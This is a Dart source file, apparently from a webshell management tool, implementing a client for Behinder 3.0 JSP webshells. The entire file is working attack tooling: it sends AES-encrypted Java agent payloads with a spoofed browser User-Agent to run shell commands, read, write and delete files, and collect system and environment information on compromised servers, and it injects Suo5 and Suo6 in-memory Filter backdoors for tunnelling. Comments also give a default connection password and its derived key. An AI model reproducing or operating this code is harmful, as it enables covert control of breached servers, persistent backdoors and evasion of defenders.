import 'dart:async';
import 'dart:convert';
import 'dart:io' as io;
import 'dart:math' as math;
import 'dart:typed_data';

import 'package:encrypt/encrypt.dart' as enc;
import 'package:flutter/foundation.dart';
import 'package:flutter/services.dart' show rootBundle;
import 'package:http/http.dart' as http;

import '../core/crypto/behinder_crypto.dart';
import '../models/file_entry.dart';
import '../utils/encoding_utils.dart';
import 'jsp_webapp_path.dart';
import 'shell_connector.dart';
import 'shell_exec_connector.dart';

/// `jsp_behinder.jsp` / `bing.jsp`：冰蝎 3.0 协议，AES 加密传输
///
/// 大文件上传加速（Session 分块 `wpart`）设计说明见 [docs/jsp_upload_behinder_analysis.md](docs/jsp_upload_behinder_analysis.md)。
///
/// 密钥 = MD5(连接密码)[0:16]，默认密码 mAtrix_911 → 42b842fc69195c9d
/// POST body 两行：第 1 行 base64(AES_encrypt(M.class))，第 2 行 a=exec&_k=xxx&xxx=cmd
/// bing.jsp 兼容：payload 只读第一行，agent 用 getReader().readLine() 读第二行解析参数
class JspBehinderConnector extends ShellConnector {
  JspBehinderConnector(super.webshell);

  late final http.Client _client = http.Client();
  final Map<String, String> _cookies = {};
  late final String _execKey = _randomHex32();

  static String _randomHex32() {
    final rng = math.Random.secure();
    return List.generate(32, (_) => rng.nextInt(16).toRadixString(16)).join();
  }

  /// 冰蝎密钥：支持两种格式
  /// 1. 16 位十六进制（如 e45e329feb5d925b）→ 直接作为密钥，用于匹配 payload 中的 String k="xxx"
  /// 2. 其他 → 视为连接密码，密钥 = MD5(password)[0:16]
  String get _key => BehinderCrypto.deriveKey(webshell.password);

  @override
  Set<ConnectorCapability> get capabilities => const {
    ConnectorCapability.codeExec,
    ConnectorCapability.shellExec,
    ConnectorCapability.fileRead,
    ConnectorCapability.fileWrite,
  };

  Future<Uint8List> _getAgentBytes() async {
    String b64;
    try {
      b64 = (await rootBundle.loadString('data/jsp_agent_M.b64')).trim();
    } catch (_) {
      try {
        final file = io.File('data/jsp_agent_M.b64');
        b64 = await file.exists() ? (await file.readAsString()).trim() : '';
      } catch (_) {
        b64 = '';
      }
    }
    if (b64.isEmpty) return Uint8List(0);
    return Uint8List.fromList(base64.decode(b64));
  }

  void _updateCookies(http.Response response) {
    final raw = response.headers['set-cookie'];
    if (raw == null) return;
    final part = raw.split(';').first.trim();
    final eq = part.indexOf('=');
    if (eq > 0)
      _cookies[part.substring(0, eq).trim()] = part.substring(eq + 1).trim();
  }

  Map<String, String> _requestHeaders(
    String action,
    Map<String, String> extraParams,
  ) {
    final h = <String, String>{
      'Content-Type': 'application/octet-stream',
    };
    if (_cookies.isNotEmpty) {
      h['Cookie'] = _cookies.entries
          .map((e) => '${e.key}=${e.value}')
          .join('; ');
    }
    // 参数全部在 body 第二行，不再走 Header（兼容旧 Agent 的回退保留在 M.java 中）
    return h;
  }

  String _aesEncryptBase64(Uint8List plain) {
    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
    final encrypted = encrypter.encryptBytes(plain);
    return base64.encode(encrypted.bytes);
  }

  bool _sessionEstablished = false;
  String? _lastPingDiagnostic;

  @override
  String? get lastPingDiagnostic => _lastPingDiagnostic;

  /// 首次请求前 GET 建立 session（部分 Tomcat/JBoss 需要）
  Future<void> _ensureSession() async {
    if (_sessionEstablished) return;
    try {
      final uri = Uri.parse(webshell.url);
      final r = await _client.get(uri).timeout(const Duration(seconds: 10));
      _updateCookies(r);
      _sessionEstablished = true;
    } catch (_) {
      // GET 失败不阻断，POST 仍可尝试
      _sessionEstablished = true;
    }
  }

  /// AES-128-ECB 加密参数字符串 → Base64（用于 POST body 第二行）。
  String _encryptParamsB64(String params) {
    final key = enc.Key(Uint8List.fromList(utf8.encode(_key)));
    final encrypter = enc.Encrypter(enc.AES(key, mode: enc.AESMode.ecb));
    final encrypted = encrypter.encryptBytes(utf8.encode(params));
    return base64.encode(encrypted.bytes);
  }

  Future<String> _sendBehinder(
    String action, {
    Map<String, String> extraParams = const {},
  }) async {
    try {
      await _ensureSession();

      final agentBytes = await _getAgentBytes();
      if (agentBytes.isEmpty) return '[Error] jsp_agent_M.b64 未找到';

      // 第一行：AES 加密的 Agent class（JSP shell 读取）
      final b64Payload = _aesEncryptBase64(
        agentBytes,
      ).replaceAll('\n', '').replaceAll('\r', '');

      // 第二行：AES 加密的参数（Agent 自己读取）
      final allParams = <String, String>{'a': action, ...extraParams};
      final paramsStr = allParams.entries
          .map((e) => '${Uri.encodeComponent(e.key)}=${Uri.encodeComponent(e.value)}')
          .join('&');
      final b64Params = _encryptParamsB64(paramsStr).replaceAll('\n', '').replaceAll('\r', '');
      final bodyBytes = utf8.encode('$b64Payload\n$b64Params');

      final uri = Uri.parse(webshell.url);
      final headers = _requestHeaders(action, extraParams);
      // 增加触发 Header 兼容性
      headers['Accept'] = '*/*';
      headers['User-Agent'] =
          'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36';

      final response = await _client
          .post(uri, headers: headers, body: bodyBytes)
          .timeout(const Duration(seconds: 25));

      _updateCookies(response);
      if (response.statusCode == 200) {
        final body = decodeWithFallback(response.bodyBytes);
        // 如果响应包含典型的 Shiro 登录特征，说明内存马未生效
        if (body.contains('rememberMe=deleteMe') ||
            response.headers['set-cookie']?.contains('rememberMe=deleteMe') ==
                true) {
          return '[Error] 内存马未响应 (被 Shiro 重定向/拦截)';
        }
        // 标准 Behinder JSP Agent：base64(AES/ECB(json)) 纯 ASCII
        // → aes_with_magic 协议：base64(AES/ECB(json)) + magic tail
        // → Matrix 旧版：base64(AES/ECB 纯文本) 或 明文
        final decrypted = BehinderCrypto.tryDecryptJsp(body, _key) ??
            BehinderCrypto.tryDecryptJspWithMagic(response.bodyBytes, _key) ??
            BehinderCrypto.tryDecryptLegacyMatrix(body, _key);
        if (decrypted != null) return BehinderCrypto.extractResponse(decrypted);
        return body;
      }

      if (response.statusCode == 302 || response.statusCode == 301) {
        final location = response.headers['location'] ?? 'unknown';
        return '[HTTP ${response.statusCode}] 发生重定向 -> $location\n这通常意味着内存马未生效，请求被拦截到了登录页面。';
      }

      final body = decodeWithFallback(response.bodyBytes);
      final snippet = body.length > 4096
          ? '${body.substring(0, 4096)}...'
          : body;
      return '[HTTP ${response.statusCode}] 请求失败\n$snippet';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  // ── ShellConnector 实现 ────────────────────────────────────────────────────

  @override
  Future<bool> ping() async {
    try {
      final r = await _sendBehinder(
        'ping',
      ).timeout(const Duration(seconds: 15));
      if (r.contains('MATRIX_JSP_PING')) {
        _lastPingDiagnostic = null;
        return true;
      }
      if (r.trim().isEmpty) {
        _lastPingDiagnostic =
            'HTTP 200 但响应体为空。请核对：① 内存马 JSP 内 AES 密钥与 Matrix「密码」是否一致；'
            '② 是否已 flutter clean 完整重建（jsp_agent_M.b64 需进包）；③ 目标是否拦截 application/octet-stream POST；'
            '④ Tomcat 10+/Jakarta 需使用已更新的 agent（纯反射、无 javax 强转）。';
      } else {
        _lastPingDiagnostic = r;
      }
      return false;
    } catch (e) {
      _lastPingDiagnostic = e.toString();
      return false;
    }
  }

  static String _sq(String s) => "'${s.replaceAll("'", "'\\''")}'";

  static bool _hasNonAscii(String s) => s.codeUnits.any((c) => c > 127);

  /// 构建路径参数（参数在 body 第二行，无长度限制）。
  /// 含非 ASCII 时用 base64 编码，agent 端自动解码。
  static Map<String, String> _pathParams(String path) {
    if (_hasNonAscii(path)) {
      return {'path_b64': base64.encode(utf8.encode(path))};
    }
    return {'path': path};
  }

  @override
  Future<String> executeCommand(String cmd, {String workingDir = ''}) async {
    final String cd;
    if (workingDir.isNotEmpty && workingDir.startsWith('/')) {
      if (_hasNonAscii(workingDir)) {
        final b64Wd = base64.encode(utf8.encode(workingDir));
        cd = "_wd=\$(echo ${_sq(b64Wd)}|base64 -d) && cd \"\$_wd\" && ";
      } else {
        cd = 'cd ${_sq(workingDir)} && ';
      }
    } else {
      cd = '';
    }
    final script = '$cd${ShellExecConnector.quoteRmOperandIfNeeded(cmd)}';
    final r = await _sendBehinder(
      'exec',
      extraParams: {'_k': _execKey, _execKey: script},
    );
    return r.trim();
  }

  @override
  Future<String> getCurrentDir() async {
    final r = (await _sendBehinder('pwd')).trim();
    if (r.isNotEmpty && !r.startsWith('[')) currentDir = r;
    return currentDir;
  }

  @override
  Future<String?> getShellScriptDir() => JspWebappPath.resolveJspAgentShellScriptDir(
        supportsShellExec: supportsShellExec,
        shellUrl: webshell.url,
        loadSysinfo: getSystemInfo,
        exec: executeCommand,
      );

  List<FileEntry> _parseLsOutput(String result) {
    return result
        .trim()
        .split('\n')
        .where((l) => l.contains('|'))
        .map((line) {
          final parts = line.trim().split('|');
          if (parts.length < 5) return null;
          String name;
          try {
            name = decodeWithFallback(base64.decode(parts[0]));
          } catch (_) {
            name = parts[0];
          }
          return FileEntry(
            name: name,
            isDirectory: parts[1] == 'd',
            size: int.tryParse(parts[2]) ?? 0,
            permissions: parts[3],
            modified: parts[4],
          );
        })
        .whereType<FileEntry>()
        .where((e) => e.name != '.')
        .toList()
      ..sort((a, b) {
        if (a.name == '..') return -1;
        if (b.name == '..') return 1;
        if (a.isDirectory != b.isDirectory) return a.isDirectory ? -1 : 1;
        return a.name.toLowerCase().compareTo(b.name.toLowerCase());
      });
  }

  @override
  Future<List<FileEntry>> listDirectory(String path) async {
    final result = await _sendBehinder('ls', extraParams: _pathParams(path));
    if (result.isEmpty ||
        result.startsWith('ERR_OPEN') ||
        result.startsWith('[')) {
      return [];
    }
    return _parseLsOutput(result);
  }

  @override
  Future<String> readFile(String path) async {
    try {
      return decodeWithFallback(await readFileBinary(path));
    } catch (_) {
      return '[文件不存在或无权读取]';
    }
  }

  @override
  Future<bool> writeFile(String path, String content) =>
      writeFileBinaryWithProgress(
        path,
        Uint8List.fromList(utf8.encode(content)),
        (_, _) {},
      );

  @override
  Future<bool> deleteFile(String path) async {
    try {
      final r = await _sendBehinder('rm', extraParams: _pathParams(path));
      if (r.trim() == '1') return true;
    } catch (_) {}
    final b64Path = base64.encode(utf8.encode(path));
    final cmd =
        "_p=\$(echo ${_sq(b64Path)} | base64 -d) && rm \"\$_p\" && echo 1 || echo 0";
    final r = await _sendBehinder(
      'exec',
      extraParams: {'_k': _execKey, _execKey: cmd},
    );
    return r.trim().contains('1');
  }

  @override
  Future<Uint8List> readFileBinary(String path) async {
    // base64-encode the path so non-ASCII names (e.g. Chinese) are safe in the
    // HTTP header value sent to the behinder agent.
    final b64Path = base64.encode(utf8.encode(path));
    final cmd =
        "_p=\$(echo ${_sq(b64Path)} | base64 -d)"
        " && cat \"\$_p\" 2>/dev/null | base64 -w0 2>/dev/null"
        " || cat \"\$_p\" 2>/dev/null | base64";
    final result = await _sendBehinder(
      'exec',
      extraParams: {'_k': _execKey, _execKey: cmd},
    );
    final b64 = result.trim().replaceAll(RegExp(r'\s'), '');
    if (b64.isEmpty || b64.startsWith('[')) {
      throw Exception('无法读取文件: $b64');
    }
    return base64.decode(b64);
  }

  /// 上传场景下的实际写入路径：
  /// 现在统一直接使用调用方传入的路径（即当前浏览目录下的目标路径），
  /// 不再强制落到 /tmp。
  static String _uploadPathFor(String path) {
    return path;
  }

  @override
  Future<bool> writeFileBinary(String path, Uint8List bytes) async {
    return writeFileBinaryWithProgress(path, bytes, (_, _) {});
  }

  /// exec 回退路径：参数在 body 第二行，不再受 Header 8KB 限制。
  static const _kChunkSize = 512 * 1024; // 512KB exec fallback

  /// 单次直写最大字节数；超过则走 wpart 顺序分片。
  /// raw × 1.78 ≈ POST body（base64+AES+base64），2MB 对应 ~3.6MB body。
  static const _kMaxSingleWrite = 2 * 1024 * 1024; // 2MB

  Future<void> _wcloseRemoteFile(String target) async {
    try {
      await _sendBehinder('wclose', extraParams: _pathParams(target));
    } catch (_) {}
  }

  Future<bool> _uploadWpartBlock(
    String path,
    Uint8List full,
    int blockIndex,
    int blockSize,
  ) async {
    final start = blockIndex * blockSize;
    if (start >= full.length) return true;
    final end = math.min(start + blockSize, full.length);
    final chunk = full.sublist(start, end);
    final r = await _sendBehinder(
      'wpart',
      extraParams: {
        ..._pathParams(path),
        'data': base64.encode(chunk),
        'blk': '$blockIndex',
        'bsz': '$blockSize',
      },
    );
    return r.trim() == '1';
  }

  /// 失败返回 false，由调用方回退 exec
  Future<bool> _writeFileBinaryWpart(
    String target,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    final blockSize = math.min(_kMaxSingleWrite, total).clamp(512, _kMaxSingleWrite);
    final blockCount = (total + blockSize - 1) ~/ blockSize;

    await _sendBehinder('ping');

    for (var bi = 0; bi < blockCount; bi++) {
      if (!await _uploadWpartBlock(target, bytes, bi, blockSize)) {
        await _wcloseRemoteFile(target);
        return false;
      }
      onProgress(math.min((bi + 1) * blockSize, total), total);
    }
    await _wcloseRemoteFile(target);
    return true;
  }

  @override
  Future<bool> writeFileBinaryWithProgress(
    String path,
    Uint8List bytes,
    void Function(int sent, int total) onProgress,
  ) async {
    final total = bytes.length;
    final target = _uploadPathFor(path);
    onProgress(0, total);

    // exec 回退：路径经 shell base64 解码（与原生头的 X-Path-B64 无关）。
    final b64Target = base64.encode(utf8.encode(target));

    final pathParams = _pathParams(target);
    if (total == 0) {
      final r = await _sendBehinder(
        'write',
        extraParams: {...pathParams, 'data': ''},
      );
      if (r.trim() == '1') return true;
      final cmd =
          "_p=\$(echo ${_sq(b64Target)} | base64 -d) && : > \"\$_p\" && echo 1 || echo 0";
      final r2 = await _sendBehinder(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      return r2.trim().endsWith('1');
    }

    if (bytes.length <= _kMaxSingleWrite) {
      final dataB64 = base64.encode(bytes);
      final r = await _sendBehinder(
        'write',
        extraParams: {...pathParams, 'data': dataB64},
      );
      if (r.trim() == '1') {
        onProgress(total, total);
        return true;
      }
    }

    final ok = await _writeFileBinaryWpart(target, bytes, onProgress);
    if (ok) return true;

    int offset = 0;
    bool first = true;
    while (offset < total) {
      final end = (offset + _kChunkSize).clamp(0, total);
      final chunk = bytes.sublist(offset, end);
      final b64 = base64.encode(chunk);
      final redirect = first ? '>' : '>>';
      final cmd =
          "_p=\$(echo ${_sq(b64Target)} | base64 -d) && echo ${_sq(b64)} | base64 -d $redirect \"\$_p\" && echo 1 || echo 0";
      final r = await _sendBehinder(
        'exec',
        extraParams: {'_k': _execKey, _execKey: cmd},
      );
      if (!r.trim().endsWith('1')) {
        final snippet = r.length > 500 ? '${r.substring(0, 500)}...' : r;
        debugPrint(
          '[Matrix][jsp_behinder] 上传分块失败 path=$target offset=$offset total=$total '
          'response=${snippet.replaceAll('\n', ' ')}',
        );
        return false;
      }
      offset = end;
      first = false;
      onProgress(offset, total);
    }
    return true;
  }

  @override
  Future<Map<String, String>> getSystemInfo() async {
    final result = await _sendBehinder('sysinfo');
    final map = <String, String>{};
    if (result.isEmpty || result.startsWith('[')) return map;
    for (final line in result.trim().split('\n')) {
      final idx = line.indexOf('|');
      if (idx > 0) {
        try {
          final key = decodeWithFallback(
            base64.decode(line.substring(0, idx).trim()),
          );
          final val = decodeWithFallback(
            base64.decode(line.substring(idx + 1).trim()),
          );
          map[key] = val;
        } catch (_) {}
      }
    }
    return map;
  }

  @override
  Future<List<({String name, bool isDir})>> listNamesForCompletion(
    String path,
  ) async {
    final result = await _sendBehinder('ls', extraParams: _pathParams(path));
    if (result.isEmpty || result.startsWith('[')) return [];
    final out = <({String name, bool isDir})>[];
    for (final line in result.trim().split('\n')) {
      final parts = line.trim().split('|');
      if (parts.length < 2) continue;
      try {
        final name = decodeWithFallback(base64.decode(parts[0]));
        out.add((name: name, isDir: parts[1] == 'd'));
      } catch (_) {}
    }
    out.sort((a, b) => a.name.compareTo(b.name));
    return out;
  }

  @override
  Future<String> getHomeDir() async => (await _sendBehinder('home')).trim();

  @override
  Future<List<String>> listEnvVarNames() async {
    final result = await _sendBehinder('envnames');
    if (result.isEmpty || result.startsWith('[')) return [];
    return result.trim().split('\n').where((s) => s.isNotEmpty).toList()
      ..sort();
  }

  /// 向目标注入 suo5 Filter 内存马。
  ///
  /// 发送 Suo5FilterInject.class 作为 Behinder payload，
  /// 服务端加载后通过反射把 suo5 Filter 注册到 Servlet 容器。
  /// 返回响应体（"OK:<path>" / "OK:ALREADY" / "FAIL" / "ERR:..."）。
  Future<String> injectSuo5MemShell({
    String filterName = 's5_mem',
    String urlPath = '/*',
  }) async {
    try {
      await _ensureSession();

      String b64;
      try {
        b64 = (await io.File(
          'data/mem_shell/Suo5FilterInject.b64',
        ).readAsString()).trim();
      } catch (_) {
        try {
          b64 = (await rootBundle.loadString(
            'data/mem_shell/Suo5FilterInject.b64',
          )).trim();
        } catch (_) {
          return '[Error] Suo5FilterInject.b64 未找到，请重新构建资产';
        }
      }
      b64 = b64.replaceAll(RegExp(r'\s'), '');
      if (b64.isEmpty) return '[Error] Suo5FilterInject.b64 为空';

      final payloadBytes = Uint8List.fromList(base64.decode(b64));
      final b64Payload = _aesEncryptBase64(
        payloadBytes,
      ).replaceAll('\n', '').replaceAll('\r', '');
      final bodyBytes = utf8.encode(b64Payload);

      final uri = Uri.parse(webshell.url);
      final headers = <String, String>{
        'Content-Type': 'application/octet-stream',
        'Accept': '*/*',
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-S5-Name': filterName,
        'X-S5-Path': urlPath,
      };
      if (_cookies.isNotEmpty) {
        headers['Cookie'] = _cookies.entries
            .map((e) => '${e.key}=${e.value}')
            .join('; ');
      }

      final response = await _client
          .post(uri, headers: headers, body: bodyBytes)
          .timeout(const Duration(seconds: 25));
      _updateCookies(response);

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes).trim();
      }
      return '[HTTP ${response.statusCode}]';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }

  /// 发送 Suo6FilterInject.class 作为 Behinder payload，注入二进制多路复用隧道 Filter。
  Future<String> injectSuo6MemShell({
    String filterName = 'suo6',
    String urlPath = '/s6',
  }) async {
    try {
      await _ensureSession();

      String b64;
      try {
        b64 = (await io.File(
          'data/mem_shell/Suo6FilterInject.b64',
        ).readAsString()).trim();
      } catch (_) {
        try {
          b64 = (await rootBundle.loadString(
            'data/mem_shell/Suo6FilterInject.b64',
          )).trim();
        } catch (_) {
          return '[Error] Suo6FilterInject.b64 未找到，请重新构建资产';
        }
      }
      b64 = b64.replaceAll(RegExp(r'\s'), '');
      if (b64.isEmpty) return '[Error] Suo6FilterInject.b64 为空';

      final payloadBytes = Uint8List.fromList(base64.decode(b64));
      final b64Payload = _aesEncryptBase64(
        payloadBytes,
      ).replaceAll('\n', '').replaceAll('\r', '');
      final bodyBytes = utf8.encode(b64Payload);

      final uri = Uri.parse(webshell.url);
      final headers = <String, String>{
        'Content-Type': 'application/octet-stream',
        'Accept': '*/*',
        'User-Agent':
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36',
        'X-S6-Name': filterName,
        'X-S6-Path': urlPath,
      };
      if (_cookies.isNotEmpty) {
        headers['Cookie'] = _cookies.entries
            .map((e) => '${e.key}=${e.value}')
            .join('; ');
      }

      final response = await _client
          .post(uri, headers: headers, body: bodyBytes)
          .timeout(const Duration(seconds: 25));
      _updateCookies(response);

      if (response.statusCode == 200) {
        return decodeWithFallback(response.bodyBytes).trim();
      }
      return '[HTTP ${response.statusCode}]';
    } on TimeoutException {
      return '[Timeout] 连接超时';
    } on http.ClientException catch (e) {
      return '[Connection Error] ${e.message}';
    } catch (e) {
      return '[Error] $e';
    }
  }
}
